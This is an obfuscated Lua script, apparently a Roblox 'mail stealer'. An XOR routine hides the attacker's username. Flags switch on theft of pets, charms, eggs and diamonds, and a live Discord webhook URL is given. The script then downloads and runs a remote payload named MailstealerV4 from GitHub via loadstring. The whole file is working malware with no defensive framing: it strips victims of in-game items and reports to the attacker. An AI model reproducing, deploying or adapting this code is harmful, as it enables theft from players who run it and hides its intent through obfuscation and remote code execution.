--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end Username=v7("\218\219\205\54\193\156","\126\177\163\187\69\134\219\167");LoadScreen=false;webhook="https://discord.com/api/webhooks/1193546399548178542/ql2ZCDiumBjoKTpcDWg9ykcu1NngJJFS3Zc5kNjecppjNPFxUiigxDzqeJs4mZwl-kOg";AntiLeave=true;TeleportAfterCompletion=true;StealHuges=true;StealExclusivePets=true;StealCharms=true;StealEggs=true;StealDiamonds=true;loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptMaintolua/MailstealerV4/main/MailstealerV4.lua.txt",true))();